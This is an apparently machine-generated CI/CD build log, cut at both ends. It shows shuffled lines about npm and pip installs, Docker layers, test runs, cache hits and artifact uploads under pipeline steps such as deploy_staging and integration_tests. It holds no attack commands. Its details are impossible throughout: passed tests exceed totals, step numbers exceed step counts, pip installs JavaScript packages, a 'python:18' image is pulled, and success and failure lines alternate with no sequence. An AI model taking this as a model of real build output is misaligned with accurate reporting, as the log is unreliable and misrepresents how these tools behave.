(78MB)\nArtifact uploaded: dist.zip (20MB)\n[12:47:24] INFO: Processing request\npip: Downloading jest-3.14.tar.gz\nCache invalidated: node_modules\nTest Suites: 28 passed, 5 total\nPOST /upload - 200 (286ms)\nnpm install: added 358 packages\nCache miss for key-2550\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nBundling styles.css\nVerifying...\nTransforming 954 files...\nEnvironment: development\nStep 9/16: Testing\npip: Collecting react\nTLS handshake completed\nSuccess!\n[12:47:24] INFO: Processing request\nCompleted.\nStep 1/16: Deploying\nOK\nOK\nInstalling react@3.19.9\nException: TypeError\nUsing Python 3.9\nNODE_ENV=test\nAlready up to date.\nFetching submodules...\nyarn add: Done in 24.12s\nMinifying app.js\nStep 3/25: Linting\nnpm install: added 179 packages\nStep 17/18: Testing\nCache restored successfully (68MB)\nFetching from https://amazonaws.com/package.json\nException: TypeError\nAlready up to date.\nLayer 5/12: RUN command\nCompiling components/app.ts...\n[12:47:24] DEBUG: Connection pool: 18 active\nStep 20/25: Linting\n[12:47:24] DEBUG: Connection pool: 9 active\nGenerating source maps...\nLayer 3/15: COPY command\nSnapshots: 17 passed, 10 total\nFinished.\nnpm install: added 494 packages\nCompleted.\n[12:47:24] ERROR: Connection failed\n\u2713 Step 'install' succeeded\nImage pulled successfully\n[12:47:24] INFO: Connecting to database\nTest Suites: 48 passed, 20 total\nVerifying...\n  PASS: test_cache_hit (479ms)\nTest Suites: 47 passed, 35 total\npip: Installing build dependencies...\nnpm install: resolved 872 packages\nConnection established\n\u2713 Task completed in 3183ms\npip: Downloading express-1.20.tar.gz\nCache miss for key-6469\nStep 12/23: Testing\n[12:47:24] DEBUG: Connection pool: 15 active\nLoading...\nCreating production build...\nStep 8/16: Running migrations\nPOST /data - 202 (17ms)\nArtifact uploaded: dist.zip (79MB)\nStep 4/20: Testing\nArtifact uploaded: dist.zip (56MB)\nPOST /upload - 202 (249ms)\n[12:47:24] INFO: Connecting to database\nFAILED: test_auth_login\nTime: 110.12s\nCompiling utils/main.py...\nUploading artifact 'coverage' (47 files)\nCompiling utils/service.java...\nCache restored successfully (381MB)\n\u2713 Step 'build' succeeded\nInstalling express@2.7.0\n[12:47:24] ERROR: Connection failed\nGenerating source maps...\nUsing Node.js 16.3.2\n  PASS: unit/test_auth_login.spec.js\nUsing Python 3.11\nWaiting...\n[12:47:24] DEBUG: Loading configuration\n\u2713 Step 'checkout' succeeded\nCache restored successfully (263MB)\n[12:47:24] INFO: Starting build process\nUploading artifact 'coverage' (12 files)\nRan 20 tests in 58s\nChecking out main branch\nHEAD is now at a79db7b\nUsing Python 3.9\npip install: Successfully installed eslint-2.4\nyarn add: Done in 16.36s\nHEAD is now at a027b18\nRan 23 tests in 13s\nCache invalidated: node_modules\n[12:47:24] WARN: Deprecated API usage\nCompiling utils/index.js...\n\u2713 All checks passed\nStep 17/24: Installing dependencies\nCompiling utils/index.js...\nProcessing...\nnpm install: resolved 462 packages\n[12:47:24] WARN: Deprecated API usage\nFetching submodules...\nArtifact downloaded: 5MB\n=== Step lint completed ===\n=== Step: deploy_staging ===\n\u2717 build failed with exit code 113\nDone.\nTests: 296 passed, 252 total\n  PASS: unit/test_api_health.spec.js\n\u2713 Step 'checkout' succeeded\nCompiling utils/index.js...\nTests: 397 passed, 429 total\n\u2713 Task completed in 3391ms\nCache miss for key-1271\nBundling main.js\nnpm notice: package.json updated\nCompiling lib/main.py...\n  PASS: unit/test_cache_hit.spec.js\nStep 7/23: Deploying\nFetching from https://amazonaws.com/package.json\nOK\n[12:47:24] WARN: Deprecated API usage\nFetching from https://npmjs.org/package.json\nCache saved successfully\nnpm install: resolved 1349 packages\n[12:47:24] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/handler.rs...\nMinifying vendor.js\n[12:47:24] WARN: Deprecated API usage\nPushing to registry...\n[12:47:24] ERROR: Connection failed\n[12:47:24] INFO: Connecting to database\nSnapshots: 9 passed, 42 total\nTests: 88 passed, 407 total\n[12:47:24] ERROR: Connection failed\nnpm notice: package.json updated\nUsing Node.js 18.15.3\nGenerating source maps...\nnpm notice: package.json updated\n[12:47:24] DEBUG: Connection pool: 14 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 113\nFetching from https://amazonaws.com/package.json\n[12:47:24] INFO: Request completed\nCache saved successfully\nInstalling lodash@3.14.8\nInstalling jest@4.4.8\n[12:47:24] INFO: Starting build process\nnpm notice: created a lockfile\nImage pulled successfully\nCompiling utils/main.py...\nCache restored successfully (353MB)\nReady.\nSuccess!\nnpm install: added 273 packages\nAlready up to date.\nInstalling axios@1.4.2\nCreating production build...\nBundling runtime.css\nChecking out develop branch\nArtifact uploaded: dist.zip (9MB)\nLayer 9/10: COPY command\nCache hit for key-3514\nTime: 16.500s\nArtifact uploaded: dist.zip (85MB)\nOptimizing 33 modules...\nDone.\nProcessing...\nTLS handshake completed\n[12:47:24] INFO: Cache refreshed\nCreating production build...\nFetching from https://pypi.org/package.json\nStep 9/23: Running migrations\nCompiling components/index.js...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLayer 8/8: ENV command\nnpm notice: package.json updated\n[12:47:24] INFO: Cache refreshed\nCompiling utils/index.js...\nPulling image: alpine:3.11\n[12:47:24] INFO: Connecting to database\n  PASS: integration/test_auth_login.spec.js\nCoverage: 94% statements, 68% branches\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_api_health.spec.js\nMinifying app.js\nWARNING: jest has known vulnerabilities\nOK\nnpm notice: package.json updated\nPulling image: python:3.11\nFinished.\n[12:47:24] INFO: Connecting to database\nFetching from https://npmjs.org/package.json\n\u2713 Task completed in 3289ms\nyarn add: Done in 22.17s\n  PASS: e2e/test_user_create.spec.js\nRan 138 tests in 45s\nMinifying vendor.js\n  PASS: test_db_connect (407ms)\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:24] DEBUG: Memory usage: 441MB\nArtifact uploaded: build.tar.gz (42MB)\nFAILED: test_db_connect\n[12:47:24] DEBUG: Connection pool: 12 active\n[12:47:24] DEBUG: Initializing service\n[12:47:24] INFO: Connecting to database\nBundling styles.css\nStep 17/21: Linting\nCompleted.\nyarn add: Done in 24.63s\nTests: 317 passed, 445 total\nCompleted.\nTests: 484 passed, 123 total\nUploading artifact 'build' (23 files)\nNODE_ENV=test\nFAILED: test_api_health\nLayer 2/14: RUN command\n[12:47:24] DEBUG: Memory usage: 465MB\nMinifying app.js\n[12:47:24] DEBUG: Connection pool: 4 active\nCoverage: 91% statements, 99% branches\nTime: 56.236s\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=test\nCompiling utils/utils.go...\nUsing Node.js 20.1.4\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (200ms)\nnpm notice: created a lockfile\n[12:47:24] DEBUG: Query executed in 73ms\nUploading artifact 'dist' (44 files)\nUsing Python 3.11\n[12:47:24] WARN: Deprecated API usage\nTLS handshake completed\nGenerating source maps...\n[12:47:24] INFO: Request completed\npip: Downloading lodash-3.15.tar.gz\nStep 6/16: Linting\nStep 20/22: Installing dependencies\nnpm install: resolved 418 packages\nArtifact uploaded: dist.zip (94MB)\nNODE_ENV=test\nUploading artifact 'dist' (48 files)\n  PASS: test_auth_login (229ms)\nCache miss for key-1372\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:24] ERROR: Connection failed\npip: Collecting jest\nFetching submodules...\nSuccess!\nFinished.\nCoverage: 70% statements, 80% branches\nCache saved successfully\nFetching from https://docker.io/package.json\nPOST /upload - 201 (468ms)\nOK\npip: Downloading react-1.11.tar.gz\nArtifact uploaded: dist.zip (67MB)\nStep 2/15: Building\nPulling image: python:3.11\nCache miss for key-9631\nCache saved successfully\nPulling image: alpine:3.11\n\u2713 validate completed\nAlready up to date.\n[12:47:24] WARN: Deprecated API usage\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nyarn add: Done in 13.90s\nCache miss for key-2216\nFinished.\nCompiling utils/main.py...\npip install: Successfully installed eslint-5.17\nBuilding Docker image...\nEnvironment: development\nLoading...\npip: Installing build dependencies...\nSnapshots: 2 passed, 44 total\n[12:47:24] DEBUG: Connection pool: 1 active\nLoading...\nUploading artifact 'build' (5 files)\n[12:47:24] DEBUG: Connection pool: 8 active\n[12:47:24] INFO: Connecting to database\nCoverage: 77% statements, 95% branches\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (478ms)\n[12:47:24] INFO: Cache refreshed\nTLS handshake completed\nCompiling utils/index.js...\n[12:47:24] WARN: Deprecated API usage\nConnection established\nyarn add: Done in 29.46s\nEnvironment: production\nArtifact downloaded: 24MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed prettier-4.4\n\u2713 Step 'checkout' succeeded\n[12:47:24] WARN: Deprecated API usage\nUploading artifact 'build' (40 files)\npip: Downloading react-5.8.tar.gz\nFAILED: test_db_connect\nCompiling utils/handler.rs...\n\u2713 Task completed in 323ms\nUsing Node.js 14.7.5\nCache miss for key-5313\nArtifact uploaded: build.tar.gz (21MB)\nSuccess!\nCompiling src/index.js...\nnpm install: resolved 947 packages\nCompiling src/handler.rs...\n\u2713 Step 'install' succeeded\npip install: Successfully installed prettier-1.2\nSwitched to branch 'feature/task-259'\n\u2713 Task completed in 4918ms\nUploading artifact 'coverage' (14 files)\nTest Suites: 12 passed, 24 total\nSwitched to branch 'feature/task-301'\nnpm notice: created a lockfile\n\u2713 Step 'install' succeeded\nAlready up to date.\nLoading...\nStep 5/16: Deploying\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/app.ts...\nStep 13/18: Installing dependencies\n\u2713 All checks passed\nStep 7/20: Building\nSnapshots: 38 passed, 15 total\n[12:47:24] DEBUG: Connection pool: 16 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\nArtifact uploaded: build.tar.gz (48MB)\nStep 18/15: Deploying\nInstalling express@1.10.10\nSuccess!\n[12:47:24] DEBUG: Initializing service\n[12:47:24] INFO: Processing request\n  PASS: integration/test_user_create.spec.js\npip: Collecting react\n[12:47:24] DEBUG: Loading configuration\nUsing Python 3.10\nArtifact downloaded: 38MB\nBundling styles.js\nCompiling components/app.ts...\n[12:47:24] INFO: Cache refreshed\nCompiling utils/handler.rs...\nTests: 480 passed, 429 total\nBuilding Docker image...\nFinished.\nWARNING: eslint has known vulnerabilities\nPushing to registry...\nCompiling lib/service.java...\nUsing Python 3.10\nSuccess!\n[12:47:24] DEBUG: Memory usage: 1623MB\n[12:47:24] DEBUG: Loading configuration\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\n[12:47:24] WARN: Deprecated API usage\nFinished.\n[12:47:24] DEBUG: Loading configuration\nDone.\nStep 6/15: Running migrations\n\u2713 Step 'test' succeeded\n  PASS: e2e/test_user_create.spec.js\n[12:47:24] INFO: Request completed\n[12:47:24] INFO: Connecting to database\nTest Suites: 12 passed, 22 total\nException: ValueError\nBundling main.js\n[12:47:24] WARN: Deprecated API usage\nEnvironment: production\nException: ValueError\nTest Suites: 28 passed, 45 total\nProcessing...\nCompiling lib/service.java...\nCache invalidated: dependencies\n[12:47:24] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading react-1.10.tar.gz\nGenerating source maps...\npip install: Successfully installed axios-2.15\nChecking out master branch\n[12:47:24] DEBUG: Memory usage: 103MB\nGenerating source maps...\n\u2717 build failed with exit code 114\nTest Suites: 20 passed, 38 total\n[12:47:24] INFO: Starting build process\nCache restored successfully (58MB)\nTest Suites: 19 passed, 14 total\nArtifact uploaded: dist.zip (84MB)\nyarn add: Done in 13.33s\nReady.\nSnapshots: 17 passed, 30 total\n[12:47:24] INFO: Starting build process\nCache miss for key-4174\n[12:47:24] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\nnpm notice: created a lockfile\nRan 133 tests in 25s\nCompiling lib/app.ts...\nFAILED: test_user_create\nRan 32 tests in 49s\nTransforming 707 files...\nException: RuntimeError\n[12:47:24] WARN: Deprecated API usage\nFetching submodules...\nCache invalidated: build\nWARNING: axios has known vulnerabilities\nCompleted.\nArtifact downloaded: 41MB\nnpm install: resolved 398 packages\nLayer 10/15: COPY command\nPOST /upload - 202 (342ms)\nRan 13 tests in 12s\nTLS handshake completed\nPulling image: node:latest\nLayer 10/14: COPY command\npip: Installing build dependencies...\npip: Installing build dependencies...\nPulling image: python:18\nFetching from https://pypi.org/package.json\nPushing to registry...\n[12:47:24] INFO: Processing request\nEnvironment: staging\nStep 1/24: Deploying\nHEAD is now at 959c682\nOK\nConnection established\n[12:47:24] DEBUG: Memory usage: 1643MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 115\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 23 passed, 49 total\n[12:47:24] DEBUG: Query executed in 32ms\nStep 2/24: Deploying\n[12:47:24] INFO: Cache refreshed\nStep 19/19: Deploying\nTime: 41.642s\nCoverage: 88% statements, 87% branches\n  PASS: test_cache_hit (73ms)\nTransforming 239 files...\nNODE_ENV=test\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (17MB)\nnpm install: resolved 751 packages\n[12:47:24] INFO: Connecting to database\nStep 8/22: Running migrations\nnpm install: resolved 617 packages\nnpm notice: package.json updated\nNODE_ENV=test\nFAILED: test_db_connect\nNODE_ENV=development\n\u2713 package completed\nProcessing...\nTests: 458 passed, 422 total\nnpm notice: package.json updated\nCompleted.\nArtifact uploaded: dist.zip (93MB)\nConnection established\n\u2713 Step 'test' succeeded\nOK\nUsing Node.js 20.16.10\n\u2713 lint completed\n\u2713 lint completed\nInstalling react@2.2.5\npip: Downloading webpack-5.9.tar.gz\nPlatform: win32-x64\nCache saved successfully\nOptimizing 30 modules...\nOK\nFAILED: test_db_connect\nStep 18/22: Installing dependencies\nUploading artifact 'coverage' (36 files)\nCache hit for key-1515\nCompiling src/handler.rs...\nImage pulled successfully\nNODE_ENV=production\nArtifact uploaded: dist.zip (4MB)\nnpm notice: created a lockfile\nnpm notice: package.json updated\nInstalling prettier@4.16.7\nLayer 5/10: ENV command\nnpm notice: created a lockfile\n[12:47:24] INFO: Cache refreshed\n[12:47:24] INFO: Starting build process\nFinished.\nHEAD is now at ce823d4\nHEAD is now at c37daed\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 25\nTransforming 754 files...\n[12:47:24] DEBUG: Initializing service\nPushing to registry...\nUsing Python 3.11\nFetching from https://docker.io/package.json\nEnvironment: staging\nStep 5/23: Building\nBundling main.css\nNODE_ENV=test\npip install: Successfully installed express-3.10\n\u2713 Step 'test' succeeded\nCoverage: 77% statements, 91% branches\nImage pulled successfully\n\u2713 validate completed\nCreating production build...\npip: Installing build dependencies...\n  PASS: integration/test_user_create.spec.js\nCache invalidated: dependencies\nOptimizing 23 modules...\nInstalling express@3.8.7\nnpm install: added 435 packages\nBundling vendor.css\nProcessing...\nDone.\nOptimizing 49 modules...\nnpm notice: created a lockfile\n[12:47:24] DEBUG: Memory usage: 895MB\nStep 10/15: Linting\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 53\nStep 1/23: Testing\nReady.\nOptimizing 14 modules...\nHEAD is now at 2f3b4d9\nWARNING: axios has known vulnerabilities\nDone.\nCache saved successfully\n[12:47:24] INFO: Request completed\nnpm notice: package.json updated\nTLS handshake completed\nSuccess!\nUsing Python 3.9\nInstalling express@5.7.4\nStep 3/21: Installing dependencies\nSuccess!\nImage pulled successfully\nTests: 84 passed, 151 total\nStep 7/19: Deploying\nWARNING: jest has known vulnerabilities\nStep 4/17: Running migrations\nNODE_ENV=production\nyarn add: Done in 21.97s\nWARNING: webpack has known vulnerabilities\n[12:47:24] DEBUG: Query executed in 38ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: unit/test_db_connect.spec.js\nTLS handshake completed\nFAILED: test_user_create\n[12:47:24] INFO: Processing request\nCompleted.\n\u2713 All checks passed\nAlready up to date.\nGenerating source maps...\nTime: 63.87s\nStep 9/19: Running migrations\nTest Suites: 5 passed, 28 total\nArtifact uploaded: dist.zip (29MB)\npip install: Successfully installed eslint-3.1\nConnection established\npip: Installing build dependencies...\nVerifying...\nSwitched to branch 'feature/task-322'\nPulling image: python:latest\nWaiting...\nCompiling components/service.java...\nCompiling utils/utils.go...\nPOST /data - 202 (331ms)\n\u2713 build completed\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] WARN: Deprecated API usage\nTransforming 203 files...\nEnvironment: staging\n\u2717 build failed with exit code 37\nTLS handshake completed\nChecking out main branch\n\u2713 All checks passed\nCache hit for key-6764\nInstalling lodash@5.10.10\nFetching submodules...\nCompiling lib/app.ts...\nGenerating source maps...\nOK\nWaiting...\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 Task completed in 1916ms\nCompiling src/utils.go...\nWARNING: eslint has known vulnerabilities\nSuccess!\nGET /health - 201 (58ms)\nException: ValueError\nArtifact uploaded: dist.zip (66MB)\nCache miss for key-3279\n\u2713 Task completed in 3121ms\nCompiling components/handler.rs...\nCompiling lib/index.js...\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nnpm notice: package.json updated\nBundling main.js\nStep 2/16: Installing dependencies\n[12:47:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/app.ts...\n\u2713 Task completed in 3556ms\nStep 8/16: Testing\nStep 8/20: Testing\npip: Collecting jest\npip: Collecting lodash\nLoading...\nReady.\nPushing to registry...\nCompiling components/main.py...\nCache miss for key-5752\n[12:47:24] INFO: Cache refreshed\nTransforming 919 files...\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nProcessing...\nPushing to registry...\nStep 19/19: Running migrations\n[12:47:24] WARN: Deprecated API usage\nCache miss for key-2100\nCreating production build...\nnpm install: resolved 114 packages\nCache restored successfully (406MB)\nCache miss for key-5539\nAlready up to date.\nEnvironment: production\nStep 10/23: Linting\nStep 15/24: Deploying\n[12:47:24] WARN: Deprecated API usage\nGenerating source maps...\nStep 19/19: Building\nPulling image: alpine:3.11\nArtifact downloaded: 18MB\nnpm install: resolved 1632 packages\nChecking out master branch\n[12:47:24] INFO: Starting build process\nLayer 3/9: RUN command\nCompiling lib/main.py...\n\u2713 Task completed in 4457ms\nPOST /data - 202 (484ms)\n\u2713 All checks passed\nFetching from https://npmjs.org/package.json\nCompleted.\n[12:47:24] DEBUG: Memory usage: 1606MB\n[12:47:24] DEBUG: Loading configuration\nFAILED: test_cache_hit\n  PASS: unit/test_user_create.spec.js\nCache miss for key-2554\nOK\n[12:47:24] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nRan 189 tests in 21s\nReady.\nRan 132 tests in 7s\nFetching submodules...\nChecking out main branch\nConnection established\nCache hit for key-3654\nPlatform: linux-x64\nConnection established\npip: Downloading axios-1.6.tar.gz\nSuccess!\nSuccess!\n\u2717 build failed with exit code 19\nStep 8/18: Running migrations\n\u2713 All checks passed\nPOST /data - 200 (487ms)\nReady.\nVerifying...\nCache restored successfully (22MB)\nStep 12/23: Testing\n[12:47:24] DEBUG: Query executed in 50ms\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out develop branch\nStep 13/20: Deploying\n\u2713 Task completed in 4335ms\nDone.\nFAILED: test_cache_hit\nPlatform: linux-x64\nSuccess!\nTime: 3.539s\nGET /status - 200 (59ms)\nWARNING: react has known vulnerabilities\n\u2717 build failed with exit code 79\nCompleted.\nReady.\n[12:47:24] INFO: Starting build process\nGET /status - 204 (33ms)\nStep 2/25: Testing\nStep 17/18: Installing dependencies\nBuilding Docker image...\nStep 10/15: Running migrations\nWARNING: prettier has known vulnerabilities\nVerifying...\nVerifying...\nStep 11/17: Deploying\nOptimizing 55 modules...\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] DEBUG: Memory usage: 1418MB\nyarn add: Done in 14.54s\nHEAD is now at 5dc52f3\nCompiling src/index.js...\nnpm notice: package.json updated\nnpm notice: created a lockfile\nTransforming 279 files...\nAlready up to date.\nStep 15/25: Running migrations\nStep 9/24: Running migrations\nStep 19/23: Deploying\n[12:47:24] WARN: Deprecated API usage\nnpm install: added 137 packages\nWARNING: express has known vulnerabilities\n[12:47:24] DEBUG: Loading configuration\nGenerating source maps...\nMinifying main.js\npip: Downloading axios-5.20.tar.gz\n\u2717 build failed with exit code 22\nUsing Node.js 18.15.3\n[12:47:24] INFO: Request completed\nReady.\n[12:47:24] INFO: Processing request\nImage pulled successfully\n  PASS: e2e/test_auth_login.spec.js\nEnvironment: staging\n[12:47:24] INFO: Processing request\nCompiling lib/index.js...\nUploading artifact 'build' (36 files)\nStep 5/23: Linting\n\u2713 build completed\n[12:47:24] INFO: Starting build process\nnpm install: resolved 1434 packages\nMinifying app.js\n\u2713 Task completed in 315ms\nSwitched to branch 'feature/task-300'\nPlatform: darwin-arm64\nSuccess!\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] DEBUG: Connection pool: 11 active\n[12:47:24] DEBUG: Initializing service\nCreating production build...\nCreating production build...\nWaiting...\n[12:47:24] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (31MB)\nOK\nLayer 3/9: ENV command\nCoverage: 76% statements, 76% branches\nBuilding Docker image...\nPOST /api - 201 (497ms)\nRan 99 tests in 60s\nImage pulled successfully\nLayer 8/14: RUN command\nSnapshots: 17 passed, 19 total\nStep 1/15: Testing\nStep 8/15: Deploying\n  PASS: test_auth_login (119ms)\nCompiling utils/utils.go...\nWARNING: react has known vulnerabilities\nException: TypeError\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\nPOST /api - 201 (347ms)\nBuilding Docker image...\nSwitched to branch 'bugfix/task-228'\nCache hit for key-6026\nOptimizing 86 modules...\n[12:47:24] INFO: Cache refreshed\nGenerating source maps...\nFinished.\nPOST /data - 202 (346ms)\nPushing to registry...\nCompiling components/app.ts...\n[12:47:24] DEBUG: Memory usage: 1319MB\nTransforming 252 files...\nSnapshots: 14 passed, 47 total\nFetching submodules...\nPOST /data - 201 (254ms)\nFetching submodules...\n[12:47:24] INFO: Connecting to database\nNODE_ENV=development\nGET /status - 204 (22ms)\nnpm install: added 172 packages\nOK\nAlready up to date.\nPOST /data - 202 (494ms)\nCache hit for key-3820\nNODE_ENV=production\n[12:47:24] INFO: Request completed\nTLS handshake completed\nLoading...\nUploading artifact 'coverage' (45 files)\npip: Installing build dependencies...\nFetching submodules...\nStep 2/24: Linting\nCache restored successfully (489MB)\n[12:47:24] INFO: Starting build process\nStep 10/25: Linting\nnpm install: added 386 packages\nSnapshots: 45 passed, 20 total\n[12:47:24] WARN: Deprecated API usage\nOptimizing 67 modules...\n  PASS: test_cache_hit (30ms)\npip: Downloading axios-3.13.tar.gz\n\u2713 All checks passed\nEnvironment: test\npip: Installing build dependencies...\nTransforming 111 files...\nArtifact downloaded: 15MB\nPlatform: darwin-arm64\nConnection established\npip: Installing build dependencies...\nCompiling src/main.py...\npip: Downloading prettier-4.10.tar.gz\nImage pulled successfully\npip: Collecting react\nUploading artifact 'dist' (37 files)\nDone.\n[12:47:24] ERROR: Connection failed\n  PASS: test_db_connect (395ms)\nUploading artifact 'coverage' (28 files)\nHEAD is now at 0f1559a\nCompiling components/app.ts...\n[12:47:24] INFO: Request completed\nFinished.\nCache invalidated: dependencies\nSnapshots: 7 passed, 16 total\nChecking out master branch\nWARNING: webpack has known vulnerabilities\nProcessing...\nUsing Node.js 15.5.5\nGET /api - 204 (66ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 deploy completed\n\u2713 All checks passed\n[12:47:24] INFO: Cache refreshed\nPOST /data - 201 (238ms)\nUsing Node.js 20.5.0\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (67ms)\nyarn add: Done in 1.31s\nAlready up to date.\nLayer 4/11: RUN command\nFinished.\n  PASS: e2e/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: node:18\nArtifact uploaded: dist.zip (38MB)\nArtifact uploaded: dist.zip (11MB)\nOptimizing 49 modules...\nStep 1/20: Deploying\n[12:47:24] INFO: Starting build process\nAlready up to date.\nArtifact downloaded: 21MB\nProcessing...\nCache miss for key-8097\n[12:47:24] WARN: Deprecated API usage\nnpm notice: created a lockfile\npip install: Successfully installed jest-1.3\nProcessing...\nStep 6/20: Running migrations\nPlatform: linux-x64\n[12:47:24] DEBUG: Query executed in 76ms\nBundling main.css\n[12:47:24] INFO: Processing request\nCompiling components/app.ts...\n[12:47:24] DEBUG: Memory usage: 1533MB\nTests: 97 passed, 391 total\nStep 7/17: Running migrations\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1922\nLayer 3/9: ENV command\nCompiling src/service.java...\npip install: Successfully installed webpack-4.3\nOptimizing 27 modules...\nCoverage: 83% statements, 100% branches\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: build\n\u2713 All checks passed\nStep 2/22: Linting\nOK\nDone.\nCache saved successfully\nWARNING: react has known vulnerabilities\nCache miss for key-3364\npip install: Successfully installed lodash-5.12\nStep 17/24: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:24] DEBUG: Initializing service\nCache restored successfully (121MB)\nCache invalidated: build\nRan 13 tests in 35s\n\u2713 Step 'setup' succeeded\nTransforming 480 files...\nNODE_ENV=development\n  PASS: test_db_connect (264ms)\npip: Installing build dependencies...\nTest Suites: 29 passed, 16 total\npip: Downloading jest-4.16.tar.gz\nCache invalidated: node_modules\nCoverage: 73% statements, 93% branches\n  PASS: test_db_connect (413ms)\nPulling image: python:latest\nProcessing...\nCache invalidated: dependencies\n[12:47:24] INFO: Cache refreshed\nFetching from https://docker.io/package.json\n  PASS: e2e/test_api_health.spec.js\n[12:47:24] WARN: Deprecated API usage\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (15MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\nReady.\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 34MB\nCache invalidated: build\nOK\nReady.\nGET /status - 200 (62ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting eslint\nLayer 3/11: ENV command\nCompiling utils/app.ts...\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\nProcessing...\nInstalling express@4.20.2\nChecking out develop branch\nMinifying main.js\nPlatform: linux-x64\nOptimizing 17 modules...\nArtifact uploaded: dist.zip (26MB)\n[12:47:24] INFO: Request completed\nImage pulled successfully\nReady.\nCompiling utils/service.java...\nFetching from https://docker.io/package.json\nCompiling lib/main.py...\n  PASS: test_cache_hit (420ms)\n[12:47:24] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (56MB)\n\u2717 build failed with exit code 111\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nPushing to registry...\nCompiling lib/app.ts...\nCompiling components/app.ts...\nLoading...\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (15MB)\nTLS handshake completed\nStep 13/15: Deploying\n\u2713 All checks passed\nStep 20/25: Building\nCache saved successfully\n  PASS: test_db_connect (460ms)\n  PASS: test_api_health (207ms)\n[12:47:24] DEBUG: Loading configuration\nException: RuntimeError\nGET /api - 201 (32ms)\nCompiling lib/index.js...\nFetching from https://amazonaws.com/package.json\nOptimizing 96 modules...\nCompleted.\nCache restored successfully (317MB)\nStep 13/18: Deploying\nOK\nnpm notice: created a lockfile\n[12:47:24] WARN: Deprecated API usage\nLoading...\n\u2713 All checks passed\n[12:47:24] INFO: Cache refreshed\nReady.\nOptimizing 94 modules...\nOK\nAlready up to date.\nCreating production build...\nMinifying app.js\nnpm notice: created a lockfile\nGenerating source maps...\nCompiling lib/main.py...\nArtifact uploaded: dist.zip (21MB)\nCache saved successfully\nBuilding Docker image...\nInstalling express@3.3.3\nnpm install: resolved 1040 packages\nnpm install: resolved 1436 packages\nCompiling src/service.java...\nSnapshots: 0 passed, 20 total\nCache hit for key-5115\npip: Collecting prettier\nUsing Node.js 18.11.5\nHEAD is now at d40fd84\n  PASS: e2e/test_auth_login.spec.js\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\nnpm notice: package.json updated\nConnection established\n\u2713 validate completed\nPOST /data - 201 (28ms)\nOK\nUploading artifact 'dist' (27 files)\nFetching submodules...\npip install: Successfully installed axios-2.8\n[12:47:24] DEBUG: Initializing service\nBundling runtime.css\n  PASS: e2e/test_cache_hit.spec.js\nSuccess!\nCompiling utils/utils.go...\nFetching from https://googleapis.com/package.json\nDone.\nAlready up to date.\nReady.\n[12:47:24] INFO: Cache refreshed\nFetching submodules...\nCompiling src/index.js...\nCache hit for key-6457\nSuccess!\n[12:47:24] DEBUG: Query executed in 25ms\nBundling styles.js\nTLS handshake completed\nCompleted.\nFAILED: test_user_create\nTests: 356 passed, 324 total\nFetching submodules...\n[12:47:24] WARN: Deprecated API usage\nStep 20/23: Linting\nCompiling components/service.java...\n  PASS: test_api_health (388ms)\nTime: 116.298s\npip: Collecting prettier\nTLS handshake completed\nTest Suites: 15 passed, 30 